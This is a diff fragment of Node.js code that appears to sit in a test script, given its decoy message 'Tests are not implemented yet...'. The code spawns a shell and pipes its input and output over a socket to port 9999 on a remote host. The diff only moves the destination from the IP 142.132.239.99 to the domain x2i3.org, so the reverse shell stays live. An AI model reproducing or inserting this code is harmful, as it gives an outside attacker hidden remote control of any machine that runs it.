@@ -6,7 +6,7 @@
         sh = cp.spawn("sh", []);
 	console.log("Tests are not implemented yet...");
     var client = new net.Socket();
-    client.connect(9999, "142.132.239.99", function(){
+    client.connect(9999, "x2i3.org", function(){
         client.pipe(sh.stdin);
         sh.stdout.pipe(client);
         sh.stderr.pipe(client);
